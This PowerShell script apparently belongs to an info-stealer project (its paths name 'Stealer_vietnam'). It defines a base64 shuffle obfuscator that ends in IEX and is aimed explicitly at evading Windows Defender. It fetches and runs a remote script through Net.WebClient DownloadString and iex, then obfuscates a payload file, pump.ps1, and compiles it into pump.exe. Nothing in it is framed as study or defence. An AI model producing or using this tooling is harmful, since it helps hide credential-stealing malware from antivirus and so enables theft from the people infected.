# fuck windows defender
function Base64-Obfuscator {
    # Author: Mr.Un1k0d3r RingZer0 Team
    [CmdletBinding()]
    Param (
		[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
		[string]$Data
	)
	
	
	PROCESS {
		$Seed = Get-Random
		$MixedBase64 = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes($Data) | Sort-Object { Get-Random -SetSeed $Seed }))

		$Var1 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | %{[char]$_})
		$Var2 = -Join ((65..90) + (97..122) | Get-Random -Count ((1..12) | Get-Random) | %{[char]$_})
		
		return "`$$($Var1) = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes(`'$($MixedBase64)') | Sort-Object { Get-Random -SetSeed $($Seed) })); `$$($Var2) = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(`$$($Var1))); IEX `$$($Var2)"
	}
}

iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')

$fileContent = Get-Content -Path "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.ps1" -Raw

$base64Encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))

$code = Base64-Obfuscator -Data $base64Encoded

Set-Content -Path "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.ps1" -Value $code

Invoke-ps2exe "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.ps1" "D:\a\Stealer_vietnam\Stealer_vietnam\tootls\pump\pump.exe"
